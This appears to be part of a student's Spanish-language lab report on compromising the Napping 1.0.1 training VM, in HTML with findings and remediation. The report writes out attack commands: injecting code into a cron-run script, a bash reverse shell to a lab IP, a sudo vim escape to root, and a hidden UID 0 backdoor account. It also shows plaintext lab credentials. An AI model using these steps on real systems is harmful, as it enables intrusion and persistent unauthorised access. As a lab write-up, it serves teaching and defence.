+                            <!-- IMAGEN: LS HOME ADRIAN -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia14.png" alt="Listing Adrian's Home" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                            </div>
+
+                            <p><strong>Análisis de tareas programadas:</strong> Se determinó que <code>query.py</code>
+                                es un script ejecutado de manera periódica y automatizada (mediante un <strong>cron
+                                    job</strong>) bajo el contexto del usuario adrian, cuyo propósito original era
+                                verificar el estado de un sitio web local.</p>
+
+                            <!-- IMAGEN: MORE QUERY.PY -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia15.png" alt="Inspecting query.py" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-yellow); box-shadow: 0 0 15px rgba(255, 255, 0, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Modificación del script</h3>
+                            <p>Se constató que el grupo <strong>administrators</strong>, al cual pertenece el usuario
+                                daniel, poseía permisos de escritura sobre <code>query.py</code>. Se procedió a editar
+                                el archivo para importar la librería <code>os</code> e inyectar el comando
+                                <code>os.system('/usr/bin/bash /dev/shm/connection.sh')</code>.</p>
+
+                            <!-- IMAGEN: NANO QUERY.PY INYECTADO -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia16.png" alt="Injected query.py" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-purple); box-shadow: 0 0 15px rgba(160, 32, 240, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Despliegue de Reverse Shell</h3>
+                            <p>Se creó el archivo ejecutable <code>/dev/shm/connection.sh</code> en la memoria
+                                compartida del sistema. En este archivo se configuró una reverse shell en Bash
+                                utilizando la sintaxis:
+                                <code>bash -c 'bash -i >& /dev/tcp/192.168.56.101/8000 0>&1'</code></p>
+
+                            <!-- IMAGEN: NANO CONNECTION.SH -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia17.png" alt="Connection Script" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Ejecución y estabilización</h3>
+                            <p>Tras configurar un listener en el puerto 8000, se recibió una conexión exitosa obteniendo
+                                una sesión interactiva como el usuario <strong>adrian</strong>. Posteriormente, se
+                                estabilizó la consola (TTY) empleando el intérprete de Python (<code>pty.spawn</code>):
+                            </p>
+                            <ul class="glowing-list" style="margin-top: 10px;">
+                                <li><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></li>
+                                <li><strong>Ctrl + Z</strong> (suspender proceso).</li>
+                                <li><code>stty raw -echo; fg</code> (configurar terminal local).</li>
+                                <li><code>export TERM=xterm</code></li>
+                            </ul>
+
+                            <!-- IMAGEN: REVERSE SHELL ADRIAN Y TTY -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia18.png" alt="Reverse Shell and TTY Stabilization" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-green); box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);">
+                            </div>
+
+                            <h3
+                                style="color: var(--c-purple); margin-top: 30px; border-bottom: 1px solid var(--c-purple); padding-bottom: 5px;">
+                                Escalada Vertical (Usuario root) y Persistencia</h3>
+
+                            <p style="margin-top: 15px;"><strong>Abuso de Sudoers:</strong> Al ejecutar el comando
+                                <code>sudo -l</code> para verificar los privilegios delegados al usuario adrian, se
+                                descubrió la capacidad de ejecutar el editor <code>/usr/bin/vim</code> como root sin
+                                necesidad de proveer una contraseña (<strong>NOPASSWD</strong>).</p>
+
+                            <!-- IMAGEN: SUDO -L ADRIAN -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia19.png" alt="Sudo Privileges Investigation" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                            </div>
+
+                            <p><strong>Ejecución de Bypass:</strong> Basándose en técnicas documentadas (como
+                                <strong>GTFOBins</strong>), se explotó esta mala configuración ejecutando el comando
+                                <code>sudo /usr/bin/vim -c ':!/bin/sh'</code>. Esto permitió escapar del entorno
+                                restringido del editor y generar una consola interactiva con privilegios máximos
+                                (<strong>root</strong>).</p>
+
+                            <!-- IMAGEN: WHOAMI ROOT -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia20.png" alt="Root Access Confirmed" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-yellow); box-shadow: 0 0 15px rgba(255, 255, 0, 0.2);">
+                            </div>
+
+                            <p><strong>Mantenimiento de acceso:</strong> Para asegurar la persistencia en el sistema, se
+                                añadió un usuario oculto con identificadores administrativos (UID 0 y GID 0) denominado
+                                <strong>Equipo4</strong> (con contraseña: <strong>123456@</strong>), validando su
+                                creación en el archivo <code>/etc/passwd</code>.</p>
+
+                            <!-- IMAGEN: PERSISTENCIA EQUIPO4 -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia21.png" alt="Persistence Mechanism" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-purple); box-shadow: 0 0 15px rgba(160, 32, 240, 0.2);">
+                            </div>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">9. Análisis de impacto (modelo CIA)</h2>
+                        <div class="info-box" style="border-color: var(--c-purple);">
+                            <p>El compromiso sistemático de la infraestructura objetivo, que culminó en la obtención de
+                                privilegios máximos (root), representa un riesgo crítico para las operaciones de la
+                                organización. A continuación, se detalla el impacto estructurado bajo los tres pilares
+                                fundamentales de la seguridad de la información:</p>
+                            <ul class="glowing-list" style="margin-top: 15px;">
+                                <li><strong>Confidencialidad (Nivel de impacto: Crítico):</strong> La escalada de
+                                    privilegios a administrador otorgó acceso irrestricto a la totalidad del sistema de
+                                    archivos. Se comprobó que un atacante puede leer información sensible de cualquier
+                                    usuario, incluyendo credenciales de bases de datos codificadas en texto plano dentro
+                                    de scripts internos (como se evidenció en el archivo <code>del_users.py</code> que
+                                    contenía el usuario "adrian" y su contraseña de base de datos). Esto expone datos
+                                    corporativos, propiedad intelectual y registros de usuarios a la exfiltración y el
+                                    espionaje.</li>
+                                <li style="margin-top: 10px;"><strong>Integridad (Nivel de impacto: Crítico):</strong>
+                                    Se demostró la capacidad de alterar el funcionamiento lógico de los procesos
+                                    internos del servidor. Al contar con permisos de escritura sobre el script
+                                    automatizado <code>query.py</code>, fue posible inyectar código arbitrario para
+                                    alterar el comportamiento esperado del sistema. A nivel de superusuario, un actor
+                                    malicioso tiene la capacidad de modificar registros de auditoría (logs) para borrar
+                                    sus huellas, alterar el código fuente de la aplicación web alojada o manipular la
+                                    información de la base de datos.</li>
+                                <li style="margin-top: 10px;"><strong>Disponibilidad (Nivel de impacto:
+                                        Crítico):</strong> El control absoluto sobre la máquina virtual Napping faculta
+                                    a un atacante para interrumpir por completo los servicios operativos. Se observó que
+                                    el sistema posee scripts (como <code>del_users.py</code>) con la instrucción
+                                    <strong>TRUNCATE TABLE users</strong>, lo que implica que un atacante podría
+                                    destruir bases de datos enteras de manera instantánea. Además, el acceso root
+                                    permite la ejecución de ataques de denegación de servicio (DoS) locales, el apagado
+                                    del servidor o el despliegue de ransomware para secuestrar la infraestructura.</li>
+                            </ul>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">10. Recomendaciones técnicas</h2>
+                        <div class="sec">
+                            <p>Para mitigar los riesgos identificados y fortalecer la postura de seguridad del servidor,
+                                se propone la implementación inmediata de los siguientes controles técnicos y
+                                administrativos:</p>
+                            <ul class="glowing-list" style="margin-top: 15px;">
+                                <li><strong>Mitigación de vulnerabilidades web (Tabnabbing):</strong> Se debe sanitizar
+                                    el manejo de enlaces externos implementando los atributos
+                                    <code>rel="noopener noreferrer"</code> en todas las etiquetas HTML de anclaje
+                                    (<code>&lt;a&gt;</code>) que utilicen el atributo <code>target="_blank"</code>. Esta
+                                    medida técnica neutralizará el acceso de las páginas abiertas al objeto
+                                    <code>window.opener</code>.</li>
+                                <li style="margin-top: 10px;"><strong>Restricción de permisos y control de
+                                        acceso:</strong> Se recomienda auditar recursivamente los permisos de los
+                                    directorios de usuario utilizando los comandos <code>chown</code> y
+                                    <code>chmod</code>. Los scripts invocados por tareas programadas deben tener
+                                    permisos estrictos configurados en <strong>755 o 700</strong>, garantizando que
+                                    únicamente el propietario legítimo tenga la capacidad de modificarlos.</li>
+                                <li style="margin-top: 10px;"><strong>Endurecimiento de políticas de Sudoers
+                                        (Hardening):</strong> Se debe remover inmediatamente la directiva
+                                    <strong>NOPASSWD</strong> para el binario <code>/usr/bin/vim</code> en el archivo
+                                    <code>sudoers</code>. Cualquier ejecución de herramientas interactivas con
+                                    privilegios elevados debe ser estrictamente justificada, monitoreada y requerir
+                                    siempre credenciales de autenticación vigentes.</li>
+                            </ul>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">11. Tabla de hallazgos</h2>
+                        <div style="overflow-x: auto; margin-top: 15px;">
+                            <table
+                                style="width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #ccc; font-size: 0.8rem;">
+                                <thead>
+                                    <tr
+                                        style="background: rgba(255,255,255,0.1); text-align: left; color: var(--c-yellow);">
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">ID</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                                            Vulnerabilidad Identificada</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Severidad
+                                        </th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Evidencia
+                                            Técnica</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Impacto en
+                                            el Negocio</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                                            Recomendación de Remediación</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            VULN-01</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                                            <strong>Tabnabbing / Tab Hijacking</strong> (Manipulación de referencias
+                                            cruzadas)</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #ff8c00;">
+                                            Alta</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Redirección
+                                            exitosa de la sesión del administrador hacia un portal falsificado mediante
+                                            un payload HTML. Captura de credenciales del usuario daniel en texto plano.
+                                        </td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Robo de
+                                            credenciales corporativas mediante phishing avanzado, permitiendo el acceso
+                                            inicial no autorizado a la red interna.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Implementar
+                                            estrictamente los atributos <code>rel="noopener noreferrer"</code> en todos
+                                            los hipervínculos externos.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            VULN-02</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                                            <strong>Configuración insegura de permisos</strong> (Escalada de Privilegios
+                                            Local - Horizontal)</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #ff8c00;">
+                                            Alta</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">El archivo
+                                            query.py presentaba permisos de escritura (-rw-rw-r--) para el grupo
+                                            administrators. Se inyectó una reverse shell ejecutada por el cron de
+                                            adrian.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Compromiso
+                                            de cuentas de usuarios adyacentes y ejecución de código arbitrario bajo
+                                            contextos ajenos. Falla en el aislamiento de entornos.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Auditar el
+                                            sistema de archivos local y aplicar el principio de mínimo privilegio.
+                                            Restringir escritura de scripts automatizados.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            VULN-03</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                                            <strong>Configuración de directivas inseguras en sudoers</strong> (Escalada
+                                            de Privilegios a Root)</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #ff4500;">
+                                            Crítica</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Verificación
+                                            del privilegio (root) NOPASSWD: /usr/bin/vim. Escape exitoso hacia una
+                                            terminal interactiva invocando sudo /usr/bin/vim -c ':!/bin/sh'.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Pérdida
+                                            total de la confidencialidad, integridad y disponibilidad del servidor. El
+                                            atacante obtiene control absoluto de la infraestructura.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Suprimir la
+                                            directiva NOPASSWD para herramientas interactivas que soporten el escape a
+                                            shell. Restringir uso de sudo a comandos estrictamente necesarios.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            VULN-04</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                                            <strong>Almacenamiento inseguro de credenciales</strong> de BD en texto
+                                            plano</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #ffff00;">
+                                            Media</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Archivo
+                                            del_users.py localizado bajo el usuario root, el cual contiene las
+                                            credenciales (user="adrian", password="P@sswr0d456") integradas en el código
+                                            fuente.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Exposición
+                                            de credenciales de bases de datos internas que pueden ser reutilizadas para
+                                            realizar movimientos laterales o acceder a datos directamente.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Utilizar
+                                            variables de entorno seguras o bóvedas de contraseñas (Key Vaults) para la
+                                            gestión de secretos. Evitar hardcodear credenciales.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;"><i class="fas fa-book"></i> Referencias
+                            Bibliográficas</h2>
+                        <ul class="glowing-list" style="margin-top: 15px; font-size: 0.9rem;">
+                            <li>GTFOBins. (s.f.). <em>GTFOBins: Bypass local security restrictions</em>. Recuperado de
+                                <a href="https://gtfobins.github.io/" target="_blank"
+                                    style="color: var(--c-cyan);">https://gtfobins.github.io/</a></li>
+                            <li style="margin-top: 8px;">López Contreras, S. (2026). <em>Descubrimiento y Explotación de
+                                    Vulnerabilidades: Lab Napping</em> [Material de clase]. Ingeniería en Tecnologías de
+                                la Información, Universidad Politécnica de San Luis Potosí.</li>
+                            <li style="margin-top: 8px;">OWASP Foundation. (s.f.). <em>OWASP Web Security Testing Guide
+                                    (WSTG)</em>. Recuperado de <a
+                                    href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank"
+                                    style="color: var(--c-cyan);">https://owasp.org/</a></li>
+                            <li style="margin-top: 8px;">PentestMonkey. (s.f.). <em>Reverse Shell Cheat Sheet</em>.
+                                Recuperado de <a
+                                    href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
+                                    target="_blank" style="color: var(--c-cyan);">https://pentestmonkey.net/</a></li>
+                            <li style="margin-top: 8px;">The Penetration Testing Execution Standard (PTES). (s.f.).
+                                <em>PTES Technical Guidelines</em>. Recuperado de <a
+                                    href="http://www.pentest-standard.org/" target="_blank"
+                                    style="color: var(--c-cyan);">http://www.pentest-standard.org/</a></li>
+                        </ul>
+                    </article>
+
+                    <div class="tech-divider"></div>
+
+                    <!-- PRESENTACIÓN EJECUTIVA START -->
+                    <article class="article-body">
+                        <div
+                            style="text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--c-purple); padding-bottom: 20px;">
+                            <h1 style="font-family:'Orbitron'; font-size: 2.2rem; margin-bottom: 5px; color: #fff;">
+                                PRESENTACIÓN EJECUTIVA</h1>
+                            <h2 style="font-family:'Orbitron'; font-size: 1.6rem; color: var(--c-purple);">Red Team
+                                Report – Napping 1.0.1</h2>
+                        </div>
+
+                        <!-- SLIDE 1: CONTEXTO -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-purple); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(160, 32, 240, 0.3);">
+                                <span class="holo-id" style="color: var(--c-purple);">SLIDE_01</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-purple); border-color: var(--c-purple);">CONTEXTO</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-purple); margin-bottom: 15px;"><i class="fas fa-bullseye"></i>
+                                    CONTEXTO DEL ENGAGEMENT</h3>
+                                <div
+                                    style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; text-align: center;">
+                                    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                                        <span
+                                            style="display: block; font-size: 1.5rem; font-weight: bold; color: var(--c-purple);">01</span>
+                                        <p style="font-size: 0.8rem;">Evaluación de "Napping 1.0.1"</p>
+                                    </div>
+                                    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                                        <span
+                                            style="display: block; font-size: 1.5rem; font-weight: bold; color: var(--c-purple);">02</span>
+                                        <p style="font-size: 0.8rem;">Identificar vulnerabilidades explotables con
+                                            impacto real</p>
+                                    </div>
+                                    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                                        <span
+                                            style="display: block; font-size: 1.5rem; font-weight: bold; color: var(--c-purple);">03</span>
+                                        <p style="font-size: 0.8rem;">Alcance: VirtualBox - Red Host Only</p>
+                                    </div>
+                                    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                                        <span
+                                            style="display: block; font-size: 1.5rem; font-weight: bold; color: var(--c-purple);">04</span>
+                                        <p style="font-size: 0.8rem;">Perfil: Atacante Externo sin credenciales</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SLIDE 2: METODOLOGÍA -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-cyan); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(0, 255, 255, 0.3);">
+                                <span class="holo-id" style="color: var(--c-cyan);">SLIDE_02</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-cyan); border-color: var(--c-cyan);">METODOLOGÍA</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-cyan); margin-bottom: 15px;"><i
+                                        class="fas fa-project-diagram"></i> METODOLOGÍA APLICADA (OWASP & PTES)</h3>
+                                <div style="display: flex; flex-direction: column; gap: 12px; font-size: 0.85rem;">
+                                    <div style="display: flex; align-items: center; gap: 10px;">
+                                        <span
+                                            style="background: var(--c-red); color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">1</span>
+                                        <p><strong>Reconocimiento:</strong> Legion, Spider</p>
+                                    </div>
+                                    <div style="display: flex; align-items: center; gap: 10px;">
+                                        <span
+                                            style="background: var(--c-red); color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">2</span>
+                                        <p><strong>Enumeración:</strong> Nmap (Puertos 22/tcp, 80/tcp)</p>
+                                    </div>
+                                    <div style="display: flex; align-items: center; gap: 10px;">
+                                        <span
+                                            style="background: var(--c-red); color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">3</span>
+                                        <p><strong>Vectores:</strong> PHPSESSID, OS Fingerprint, Tabnabbing</p>
+                                    </div>
+                                    <div style="display: flex; align-items: center; gap: 10px;">
+                                        <span
+                                            style="background: var(--c-red); color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">4</span>
+                                        <p><strong>Explotación:</strong> Malicious Payload, Admin Credentials Leaking
+                                        </p>
+                                    </div>
+                                    <div style="display: flex; align-items: center; gap: 10px;">
+                                        <span
+                                            style="background: var(--c-red); color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">5</span>
+                                        <p><strong>Escalada:</strong> Cron poisoning, Query.py & vim poisoning</p>
+                                    </div>
+                                    <div style="display: flex; align-items: center; gap: 10px;">
+                                        <span
+                                            style="background: var(--c-red); color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">6</span>
+                                        <p><strong>Validación:</strong> Creación de cuenta local Equipo4</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SLIDE 3: RIESGO -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-red); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(255, 0, 0, 0.3);">
+                                <span class="holo-id" style="color: var(--c-red);">SLIDE_03</span>
+                                <span class="holo-status" style="color: var(--c-red); border-color: var(--c-red);">NIVEL
+                                    DE RIESGO</span>
+                            </div>
+                            <div class="holo-body">
+                                <div
+                                    style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                                    <h3 style="color: var(--c-red); margin: 0;"><i
+                                            class="fas fa-exclamation-triangle"></i> EVALUACIÓN GENERAL</h3>
+                                    <span
+                                        style="background: var(--c-red); color: #000; padding: 5px 15px; border-radius: 4px; font-weight: bold; font-family: 'Orbitron';">NIVEL
+                                        ALTO</span>
+                                </div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                                    <div
+                                        style="background: rgba(255,0,0,0.05); padding: 15px; border-radius: 8px; border-left: 3px solid var(--c-red);">
+                                        <h4 style="font-size: 0.9rem; margin-bottom: 10px; color: #fff;">RESUMEN:</h4>
+                                        <ul
+                                            style="font-size: 0.8rem; list-style: none; padding: 0; display: flex; flex-direction: column; gap: 5px;">
+                                            <li><i class="fas fa-check" style="color: var(--c-red);"></i> Servicios
+                                                expuestos</li>
+                                            <li><i class="fas fa-check" style="color: var(--c-red);"></i> Acceso inicial
+                                                logrado</li>
+                                            <li><i class="fas fa-check" style="color: var(--c-red);"></i> Escalada a
+                                                root obtenida</li>
+                                        </ul>
+                                    </div>
+                                    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                                        <h4 style="font-size: 0.9rem; margin-bottom: 10px; color: #fff;">IMPACTO:</h4>
+                                        <ul
+                                            style="font-size: 0.8rem; list-style: none; padding: 0; display: flex; flex-direction: column; gap: 5px;">
+                                            <li><strong>Compromiso total del sistema</strong></li>
+                                            <li>Acceso a información sensible</li>
+                                            <li>Potencial movimiento lateral</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                <!-- EVIDENCIA VISUAL EN SLIDE -->
+                                <div style="margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; text-align: center;">
+                                    <img src="img/actividad11/evidencia22.png" alt="Proof of Access" 
+                                        style="max-width: 80%; border-radius: 4px; filter: grayscale(0.5) contrast(1.2);">
+                                    <p style="font-size: 0.7rem; color: #666; margin-top: 5px; font-family: monospace;">EVIDENCIA_REF: SSH_ACCESS_DANIEL</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SLIDE 4: HALLAZGOS -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-yellow); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(255, 255, 0, 0.3);">
+                                <span class="holo-id" style="color: var(--c-yellow);">SLIDE_04</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-yellow); border-color: var(--c-yellow);">HALLAZGOS</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-yellow); margin-bottom: 15px;"><i
+                                        class="fas fa-search-plus"></i> HALLAZGOS CRÍTICOS</h3>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                                    <div>
+                                        <h4 style="font-size: 0.85rem; color: var(--c-yellow); margin-bottom: 8px;">H1:
+                                            Servicios Expuestos</h4>
+                                        <p style="font-size: 0.75rem; color: #ccc;">SSH, HTTP, Cron, Query.py, vim.
+                                            Superficie de ataque amplia y posibilidad de explotación remota.</p>
+                                    </div>
+                                    <div>
+                                        <h4 style="font-size: 0.85rem; color: var(--c-yellow); margin-bottom: 8px;">H2:
+                                            Aplicación Web Vulnerable</h4>
+                                        <p style="font-size: 0.75rem; color: #ccc;">Falta de validación, rutas sensibles
+                                            expuestas y manejo inseguro de entradas. Punto de entrada inicial.</p>
+                                    </div>
+                                </div>
+                                <div style="margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; text-align: center;">
+                                    <img src="img/actividad11/evidencia3.png" alt="Vuln Portal" 
+                                        style="max-width: 80%; border-radius: 4px; opacity: 0.8;">
+                                    <p style="font-size: 0.7rem; color: #666; margin-top: 5px; font-family: monospace;">EVIDENCIA_REF: WEB_VULN_PORTAL</p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- SLIDE 05: HALLAZGOS PARTE 2 -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-yellow); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(255, 255, 0, 0.3);">
+                                <span class="holo-id" style="color: var(--c-yellow);">SLIDE_05</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-yellow); border-color: var(--c-yellow);">HALLAZGOS
+                                    (CONT.)</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-yellow); margin-bottom: 15px;"><i
+                                        class="fas fa-search-plus"></i> HALLAZGOS CRÍTICOS (II)</h3>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                                    <div>
+                                        <h4 style="font-size: 0.85rem; color: var(--c-yellow); margin-bottom: 8px;">H3:
+                                            Gestión Insegura de Credenciales</h4>
+                                        <p style="font-size: 0.75rem; color: #ccc;">Presencia de credenciales débiles y
+                                            exposición en archivos del sistema. Riesgo de escalada horizontal.</p>
+                                    </div>
+                                    <div>
+                                        <h4 style="font-size: 0.85rem; color: var(--c-yellow); margin-bottom: 8px;">H4:
+                                            Escalada de Privilegios</h4>
+                                        <p style="font-size: 0.75rem; color: #ccc;">Permisos incorrectos y ejecución de
+                                            binarios elevados (root). Control total del sistema comprometido.</p>
+                                    </div>
+                                </div>
+                                <div style="margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; text-align: center;">
+                                    <img src="img/actividad11/evidencia35.png" alt="Privilege Escalation Proof" 
+                                        style="max-width: 80%; border-radius: 4px; border: 1px solid var(--c-yellow);">
+                                    <p style="font-size: 0.7rem; color: #666; margin-top: 5px; font-family: monospace;">EVIDENCIA_REF: ROOT_COMPROMISE</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SLIDE 06: IMPACTO EMPRESARIAL -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-purple); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(160, 32, 240, 0.3);">
+                                <span class="holo-id" style="color: var(--c-purple);">SLIDE_06</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-purple); border-color: var(--c-purple);">IMPACTO</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-purple); margin-bottom: 15px;"><i
+                                        class="fas fa-biohazard"></i> ESCENARIO DE IMPACTO EMPRESARIAL</h3>
+                                <div style="display: grid; grid-template-columns: 1fr 1.2fr; gap: 20px;">
+                                    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                                        <h4 style="font-size: 0.85rem; color: #fff; margin-bottom: 10px;">Cadena de
+                                            Ataque:</h4>
+                                        <ol style="font-size: 0.75rem; padding-left: 15px; color: #ccc;">
+                                            <li>Identificación de servicios (HTTP/SSH)</li>
+                                            <li>Interacción con Web vulnerable</li>
+                                            <li>Obtención de acceso inicial</li>
+                                            <li>Uso de credenciales encontradas</li>
+                                            <li>Escalada a privilegios root</li>
+                                        </ol>
+                                    </div>
+                                    <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                                        <h4 style="font-size: 0.85rem; color: #fff; margin-bottom: 10px;">Consecuencias:
+                                        </h4>
+                                        <ul style="font-size: 0.75rem; list-style: none; padding: 0; color: #ccc;">
+                                            <li><i class="fas fa-times-circle" style="color: var(--c-red);"></i>
+                                                Exfiltración de datos sensibles</li>
+                                            <li><i class="fas fa-times-circle" style="color: var(--c-red);"></i>
+                                                Interrupción de servicios críticos</li>
+                                            <li><i class="fas fa-times-circle" style="color: var(--c-red);"></i>
+                                                Compromiso de otros sistemas</li>
+                                            <li><i class="fas fa-times-circle" style="color: var(--c-red);"></i> Daño
+                                                reputacional y regulatorio</li>
+                                        </ul>
+                                    </div>
